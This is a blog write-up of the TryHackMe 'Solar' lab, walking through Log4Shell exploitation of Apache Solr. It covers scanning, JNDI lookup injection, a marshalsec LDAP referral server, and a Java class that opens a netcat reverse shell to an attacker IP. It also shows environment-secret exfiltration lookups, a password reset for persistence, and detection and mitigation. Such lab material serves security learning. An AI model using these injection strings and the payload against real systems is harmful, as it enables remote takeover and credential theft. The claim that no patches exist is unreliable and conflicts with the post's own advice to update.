---
layout: single
title: Tryhackme - Solar
excerpt: "Solar is a linux machine with medium difficulty level in the exploitation phase and easy in privilege escalation, this machine runs the apache solr 8.11.0 service which is vulnerable to log4shell and also explains what is log4j, how it works, how to exploit log4shell step by step and ways to mitigate this vulnerability."
date: 2022-01-16
classes: wide
header:
  teaser: /assets/images/img-solar/portada.png
  teaser_home_page: true
  icon: /assets/images/
categories:
  - CTF
  - Pentest
tags:
  - Tryhackme
  - Linux
  - CVE
  - RCE
---

Solar is a linux machine with medium difficulty level in the exploitation phase and easy in privilege escalation, this machine runs the apache solr 8.11.0 service which is vulnerable to log4shell and also explains what is log4j, how it works, how to exploit log4shell step by step and ways to mitigate this vulnerability.

<p align = "center">
<img src = "/assets/images/img-solar/portada.png">
</p>

The first thing we are going to do is to create a file with the machine name, and inside of that file with ***mkt*** we are going to create to following directories (the mkt function remember that I have it defined in the ***~/.zshr*** to create those directories.). 

<p align = "center">
<img src = "/assets/images/img-solar/captura1.png">
</p>

## Recognition

First we send an icmp trace to see if we have a connection on the victim machine, and with the ttl i know this is a linux machine, remember that linux machines have ttl 64 and windows machines have ttl 128. 

<p align = "center">
<img src = "/assets/images/img-solar/captura2.png">
</p>

## Task 2 - Scanning

I am going to perform a tcp syn scan by adding the min-rate parameter to make the scan go as fast as possible, and the evidence of the scan I will save it in grepable format in the allports file.

```
# Nmap 7.92 scan initiated Sun Jan 16 18:58:46 2022 as: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allports 10.10.218.103
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.218.103 ()  Status: Up
Host: 10.10.218.103 ()  Ports: 22/open/tcp//ssh///, 111/open/tcp//rpcbind///, 8983/open/tcp/////        Ignored State: closed (65532)
# Nmap done at Sun Jan 16 18:58:59 2022 -- 1 IP address (1 host up) scanned in 13.59 seconds
```

Basically i save it in the grepable format is that i have a function defined in the ~/.zshrc called ***extractports*** that indicating the name of the file shows me the ports in a more elegant way and copies the ports it to clipboard.

<p align = "center">
<img src = "/assets/images/img-solar/captura3.png">
</p>

Extractports script:

```bash
#!/bin/bash

function extractPorts(){
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
        cat extractPorts.tmp; rm extractPorts.tmp
}
```

And with the ports discovered we are going to perform another scan to know the versions of the services that run those ports with some recognition scripts (-sCV), and i will save the evidence of the scan in nmap format (it is advisable to save the scans in a file to avoid re-scanning).

```
# Nmap 7.92 scan initiated Sun Jan 16 19:00:30 2022 as: nmap -sCV -p22,111,8983 -oN targeted 10.10.218.103
Nmap scan report for 10.10.218.103
Host is up (0.066s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA)
|   256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA)
|_  256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
8983/tcp open  http    Apache Solr
| http-title: Solr Admin
|_Requested resource was http://10.10.218.103:8983/solr/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 16 19:00:45 2022 -- 1 IP address (1 host up) scanned in 14.66 seconds
```
As there is a http service on port 8983 with whatweb we do a small recognition as if it were wappalyzere extension, to know the version of the web service, cms, etc.

<p align = "center">
<img src = "/assets/images/img-solar/captura4.png">
</p>

If we access with the ip address on the port 8983 we will be in the apache solr admin page as you can see. So if you asking what is apache solr? it's an open source search platform that has written in java from apache lucene project library, basically is used to optimezed a search quries and search indexes for large amounts of data and it's used for many apps or websites that require a search engine for a lot of content and part of this functionality involves the use of cores,  once of examples can be the eccommerce websites.

<p align = "center">
<img src = "/assets/images/img-solar/captura5.png">
</p>

## Task 3 - Discovery

Basically what it is telling us is that the version apache solr 8.11.0 has log4j vulnerabilities, basically apache solr to store logs uses the log4j. And it is indicaticating us that this machine the apache solr has the minimum installation and configuration but that it does influence much since it is to give us to understand the attack.

<p align = "center">
<img src = "/assets/images/img-solar/captura7.png">
</p>

If we go back in the website we can see where tha path where the logs are stored in solr.

<p align = "center">
<img src = "/assets/images/img-solar/captura6.png">
</p>

In the task it's tells us to install a file that contain solr logs to get an idea of what they look like. So let's unzip that zip file.

<p align = "center">
<img src = "/assets/images/img-solar/captura8.png">
</p>

If we open one of the files we can see how the logs are stored in solr, but something interesting is that an ***INFO*** entry that is shown repeatedly which is the ***admin/cores*** url endpoint.

<p align = "center">
<img src = "/assets/images/img-solar/captura9.png">
</p>

Looking at these log entries we can see that in the ***parms*** field there are no info is shown, so thats mean that we could modify or add values in that specific parameter that will serve us to exploit the log4j.

<p align = "center">
<img src = "/assets/images/img-solar/captura10.png">
</p>

## Task 4 - Proof of Concept 

Well is tells us one of the pontential routes that we can exploit the log4j in this particular version of solr that we will be access in moment and we have alreadyseen one of the attack vector (***perms***). And in the documentation it show us some examples of how to perform lookups with the following syntaxes in log4j, which first would be add the prefix and then would be the name or code to be executed, and we can see that among them we can perform lookups for env variables and about the system. 

And it is show us to how abuse this, that first it would be to invoke the jndi plugin and then we indicate that it connects is our attacker ldap server: ***${jndi:ldap://ATTACKERIP:1389/PORT}***

So in the documentation it's says that the log4j vuln will invoke functionality from "JNDI", or the "Java Naming and Directory Interface". First of all is a directory service that allows any java software to find data through a directory using a name service, basically it's objective is to obtain data from other system or servers very easily and even to obtain java objects remotely (which where the problem comes from), jdni allow us to use variety directory service like ldap, rmi and more. So in this case with log4j we can utilize jndi lookups in conjunction with ldap to obtain an external resource that's being stored on any server. So some version of apache come with a pre-package with the jndi lookup plugin which is vuln. more info [here](https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell)

Now as attackers can use the jndi plugin with a malicious ldap referral server to share a malicious java class or payload. 

<p align = "center">
<img src = "/assets/images/img-solar/captura11.png">
</p>

Here it tells us that this syntax can be injected into any entry in which the logs are being registred (forms, http addresses, etc).

<p align = "center">
<img src = "/assets/images/img-solar/captura12.png">
</p>

So in this particular version of apache solr there is an api endpoint url which is the ***solr/Admin/cores*** route we can inject the jndi lookup plugin, somethinglike this: ***http://MACHINE_IP:8983/solr/admin/cores?cmd=${jndi:ldap://IP:1389/}***

<p align = "center">
<img src = "/assets/images/img-solar/captura14.png">
</p>

Ok so to know if the website is vulnerable to logj4 and if it's using log4j we need to use the following commands: 

<p align = "center">
<img src = "/assets/images/img-solar/captura13.png">
</p>

So first we need to listen with netcat to receive connection, and in a another window with the curl command we are going to inject the jndi lookup specifying our attacker ip address and the port that we are listening in netcat (which in my case it's the port 9999), and if we are receive a connection it's mean that the website is using the log4j and it's vulnerable. And with this we would resolve the POC.

<p align = "center">
<img src = "/assets/images/img-solar/captura15.png">
</p>

## Task 5 - Exploitation

In this case it tells us in the documentation how to exploit the logj to get a reverse shell, first we need to listen with netcat to receive the connection as we done in the POC, then it tells as that we need to execute a ldap refferal server and with python or php host the payload that we want to execute on the victim machine.

<p align = "center">
<img src = "/assets/images/img-solar/captura16.png">
</p>

So we need to clone this [repo](https://github.com/mbechler/marshalsec) to execute in our attacker machine the ldap referral server. In the README file of this repo it tells us that we must to hace ***java 8*** to be able to run our ldap server, in the case if we don't have java 8 installed on our attacker machine we must be follow the following installation steps shown in the documentation.

<p align = "center">
<img src = "/assets/images/img-solar/captura21.png">
</p>

Now with maven what we are going to do is to compile all the dependencies from the marshalsec repo that will be inside a folder called ***target*** that will contain the ***.jar*** file. If you dont have maven installed on your machine use the cammand: ***apt install maven***.

<p align = "center">
<img src = "/assets/images/img-solar/captura22.png">
</p>

Now we ara going to run our ldap referral server to direct connections to our secondary http server that will be host the java payload.

<p align = "center">
<img src = "/assets/images/img-solar/captura23.png">
</p>

Now let's use this java payload to get a reverse shell with netcat specifying our ip address and the port that we are going listen to.

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.8.40.42 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Then we are need to compile this java payload into a java class with the following command.

<p align = "center">
<img src = "/assets/images/img-solar/captura25.png">
</p>

With python we are going to host this java class payload to download or transfer in the victim machine.

<p align = "center">
<img src = "/assets/images/img-solar/captura26.png">
</p>

Now in another window we going to execute with curl the same command that we executed in the POC but this time we will put the name of the payload that we are hosting in python (btw you can use the http request in the browser if you want, but i recommend with curl). and as you can see that in the http server in python we have received a GET request and in netcat we already have access to the machine. And now that how we are exploit the logj vulnerabilities.

<p align = "center">
<img src = "/assets/images/img-solar/captura27.png">
</p>

If you have any problems to execute the reverse shell, here are some possible solutions.

<p align = "center">
<img src = "/assets/images/img-solar/captura28.png">
</p>

## Task 6 - Persistence

once we have access we are going to spawn a proper console with python (or you can use the command: ***script /dev/null -c bash)*** and then do the tty treatment as indicated in the documentation to move better through the console.

<p align = "center">
<img src = "/assets/images/img-solar/captura29.png">
</p>

Now we are going to export two env variables, which is ***xterm*** to get a appropriate shell to use commands like ***clear*** and ***bash***.

<p align = "center">
<img src = "/assets/images/img-solar/captura31.png">
</p>

If we use the command ***cat /etc/passwd*** we can see all the users that exist in the system.

<p align = "center">
<img src = "/assets/images/img-solar/captura32.png">
</p>

With the command ***sudo -l*** let's check if we have sudo permissions, and as you can see it's indicate ***NOPASSWS*** thats mean that we can run all sudo commands without the user password.

<p align = "center">
<img src = "/assets/images/img-solar/captura33.png">
</p>

And since we don't the password, what we can do is to change the user password on the system since we have permissions to execute sudo commands without the password, with the command ***passwd*** we will add a new password.

<p align = "center">
<img src = "/assets/images/img-solar/captura34.png">
</p>

And once we change the password we can connect with ssh to the victim machine.

<p align = "center">
<img src = "/assets/images/img-solar/captura35.png">
</p>

## Task 7 - Detection

And here it tells us the tools that we can use to detect if our java app has this vulnerability, among them detecting log4j packages that are vulnerable or detecting culnerable JAR files.

<p align = "center">
<img src = "/assets/images/img-solar/captura36.png">
</p>

Here we can see the directory where the apache solr logs are stored.

<p align = "center">
<img src = "/assets/images/img-solar/captura37.png">
</p>

In this case if we access one of these files, which in this case in the ***solr.log*** file  we can see that inside the perms field the jndi lookup has ben injected which is connect our ldap referral server and execute the malicious payload, and this would be a wey to detect this vulnerability in the log files.

<p align = "center">
<img src = "/assets/images/img-solar/captura38.png">
</p>

## Task 8 - Bypasses

And here it show us the possibles bypasses that it can be use if we are attacker, Among them we can extract env variables that can contain some type of access key, for example the ***${env:AWS_SECRET_ACCESS_KEY}*** which is very very critical. btw it's not necessary to run a ldap referral server we can use rmi protocol to search for external resources or to inject jndi lookups.

<p align = "center">
<img src = "/assets/images/img-solar/captura39.png">
</p>

So we can use the command ***printenv*** to use the env variables in the system, and se if there have a exfiltration.

<p align = "center">
<img src = "/assets/images/img-solar/captura40.png">  
</p> 

## Task 9 - Mitigation

In the case of apache solr we can perform this mitigation to aviod this type of attack.

<p align = "center">
<img src = "/assets/images/img-solar/captura43.png">
</p>

First we are gon a locate the file ***solr.in.sh*** which is contain the apache solr env variables.

<p align = "center">
<img src = "/assets/images/img-solar/captura45.png">
</p>

So once we have located it the file we open it with your favorite bash editor, and we are gon a paste this sentence ***SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"*** that we can't perform external lookups with jndi. Then save the file. 

<p align = "center">
<img src = "/assets/images/img-solar/captura46.png">
</p>

And now restart the apache solr service to apply the changes that we make.

<p align = "center">
<img src = "/assets/images/img-solar/captura47.png">
</p>

And now if we perform the same attack again to access in the system, we see that we do not have any connection from the victim machine. because now it's disable the jndi lookups which means the victima machine can't connect our ldap referral server.

<p align = "center">
<img src = "/assets/images/img-solar/captura48.png">
</p>

## Task 10 - Patching

And finally, it tells us that there are still no patches for this vulnerability (log4shell) and it's recommended to update the log4j packages to the new version that it's not include the jndi.

<p align = "center">
<img src = "/assets/images/img-solar/captura49.png">
</p>

And with this we finish the room, and we already know how this vulnerability works and how critical it is.

<p align = "center">
<img src = "/assets/images/img-solar/captura50.png">
</p>
